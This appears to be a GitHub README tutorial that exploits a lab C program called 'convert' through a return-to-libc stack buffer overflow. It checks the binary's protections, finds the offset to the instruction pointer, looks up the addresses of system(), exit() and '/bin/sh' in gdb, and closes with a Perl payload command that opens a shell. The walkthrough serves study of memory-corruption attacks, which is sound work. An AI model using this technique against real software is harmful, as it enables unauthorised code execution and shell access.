# buffer-overflow
exploit vulnerable c/c++ programms with buffer overflow attacks
___
#### `convert` C program
###### Determine protections enabled
* Canaries between buffers and control data in the stack
```
$ gdb convert
(gdb) disas main
   Dump of assembler code for function main:
   0x0804869c <+0>:	push   %ebp
   .........  ....: ....   ....
   .........  ....: ....   ....
```
`.........  ....: call 0x80484c0 <__stack_chk_fail@plt>` in the procedure epilogue indicates the presence of a canary, but in this case this mechanism wasn't enabled.
* Executable Stack Protection
```
$ readelf -l convert
Elf file type is EXEC (Executable file)
Entry point 0x80485b0
There are 8 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00100 0x00100 R E 0x4
  ....           ......   ......     ......     ......  ......  . . ...
```
`GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4` this line indicated that the Stack is Read-Write but not executable, so we have one defensive mechanism to bypass.

###### Determine the size of the buffer to override the instruction pointer `$eip`
```
$ gdb convert
(gdb) run 1 $(perl -e 'print "A"x744 . "B"x4 . "C"x4 . "D"x4')
Program received signal SIGSEGV, Segmentation fault.
0x44444444 in ?? ()
(gdb) info registers
    eax            0x0	0
    ecx            0xbfffef78	-1073746056
    edx            0xb7fd3360	-1208143008
    ebx            0x41414141	1094795585
    esp            0xbffff2c0	0xbffff2c0
    ebp            0x43434343	0x43434343
    esi            0x0	0
    edi            0x42424242	1111638594
    eip            0x44444444	0x44444444
    eflags         0x10296	[ PF AF SF IF RF ]
    cs             0x73	115
    ss             0x7b	123
    ds             0x7b	123
    es             0x7b	123
    fs             0x0	0
    gs             0x33	51
```
So the size of the buffer to overwrite the `$eip` is 756.
###### Sketch memory layout and attack plan
<img src="https://github.com/igavriil/buffer-overflow/blob/master/convert_attact.png" width="400" height="300" />
###### Find the addresses needed for the attack
``` 
$ gdb convert
(gdb) break main
(gdb) run
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7eadc30 <system>
```
**system() address**: `0xb7eadc30`
```
(gdb) find &system,+9999999,"/bin/sh"  
0xb7fae194
```
**'/bin/sh' address**: `0xb7fae194`
```
(gdb) print exit
$1 = {<text variable, no debug info>} 0xb7ea1270 <exit>
```
**exit() address**: `0xb7ea1270`
###### Create your inputs according to the sketch and run the programm
```
$ ./convert 1 $(perl -e 'print "\x90"x752 .  "\x30\xdc\xea\xb7"  . "\x70\x12\xea\xb7" . "\x94\xe1\xfa\xb7"')
$ (unlocked shell)
````
